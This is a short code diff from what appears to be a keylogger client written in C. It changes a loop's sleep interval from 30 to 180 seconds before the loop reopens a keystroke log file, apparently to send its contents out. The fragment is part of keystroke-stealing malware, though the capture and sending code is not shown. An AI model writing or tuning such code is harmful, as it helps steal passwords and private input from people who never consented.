@@ -40,7 +40,7 @@ void start_client(void)
 
     ssize_t read_size;
     while(1) {
-        sleep(30);
+        sleep(180);
         memset(send_buffer, 0, sizeof(send_buffer));  //clear send buffer
         /*Open keylog file for writing*/
         FILE *keylog_log = fopen("/.keylogger/log/keylog.txt", "r");
